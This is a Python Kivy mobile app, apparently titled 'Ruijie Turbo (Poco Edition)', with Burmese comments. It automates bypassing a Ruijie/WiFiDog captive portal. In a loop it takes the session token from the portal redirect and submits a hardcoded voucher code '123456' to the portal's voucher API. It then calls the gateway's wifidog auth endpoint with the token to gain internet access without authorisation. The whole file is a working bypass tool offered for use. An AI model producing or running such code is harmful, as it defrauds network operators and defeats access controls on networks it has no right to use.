import threading
import requests
import urllib3
import time
from urllib.parse import urlparse, parse_qs
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.graphics import Color, Rectangle

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TurboApp(App):
    def build(self):
        self.root = BoxLayout(orientation='vertical', padding=20, spacing=15)
        with self.root.canvas.before:
            Color(0.05, 0.05, 0.05, 1)
            self.rect = Rectangle(size=(2000, 2000), pos=self.root.pos)

        self.status_label = Label(text="Status: [color=00FF00]Ready[/color]", markup=True, font_size='18sp')
        self.start_btn = Button(text="START BYPASS", size_hint=(1, 0.2), background_color=(0, 0.7, 0, 1))
        self.start_btn.bind(on_press=self.start_process_thread)
        
        self.root.add_widget(Label(text="Ruijie Turbo (Poco Edition)", font_size='22sp', color=(0, 1, 1, 1)))
        self.root.add_widget(self.status_label)
        self.root.add_widget(self.start_btn)
        
        self.running = False
        return self.root

    def update_status(self, text):
        self.status_label.text = f"Status: {text}"

    def start_process_thread(self, instance):
        if not self.running:
            self.running = True
            self.update_status("[color=FFFF00]Bypassing Ruijie...[/color]")
            threading.Thread(target=self.main_logic, daemon=True).start()

    def main_logic(self):
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 11)'})

        while self.running:
            try:
                # 1. Connectivity Check & Portal URL ရှာဖွေခြင်း
                r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
                
                if r.status_code == 204:
                    Clock.schedule_once(lambda dt: self.update_status("[color=00FF00]Internet OK[/color]"), 0)
                else:
                    portal_url = r.url
                    parsed_portal = urlparse(portal_url)
                    params = parse_qs(parsed_portal.query)
                    
                    # Termux code logic အတိုင်း SID (Token) ကို ယူခြင်း
                    sid = params.get('sid', [None])[0] or params.get('token', [None])[0]
                    
                    if sid:
                        Clock.schedule_once(lambda dt: self.update_status(f"[color=00FFFF]SID Found: {sid[:5]}...[/color]"), 0)
                        
                        # ၂။ Voucher API Activation (Termux Logic)
                        portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
                        voucher_api = f"{portal_host}/api/auth/voucher/"
                        try:
                            session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                        except: pass

                        # ၃။ High-Speed Ping Logic (Termux Logic)
                        # Gateway IP ကို ၁၉၂.၁၆၈.၁၁၀.၁ ဟု သတ်မှတ်ထားသည်
                        gw_addr = params.get('gw_address', ['192.168.110.1'])[0]
                        gw_port = params.get('gw_port', ['2060'])[0]
                        auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

                        # အဆက်မပြတ် Ping ပို့ခြင်း (Thread ၁ ခုဖြင့် အစပြုခြင်း)
                        for _ in range(3):
                            session.get(auth_link, timeout=5)
                            
                        Clock.schedule_once(lambda dt: self.update_status("[color=00FF00]Bypass Active![/color]"), 0)

            except Exception as e:
                Clock.schedule_once(lambda dt: self.update_status("[color=FF8800]Searching Portal...[/color]"), 0)
            
            time.sleep(5)

if __name__ == '__main__':
    TurboApp().run()
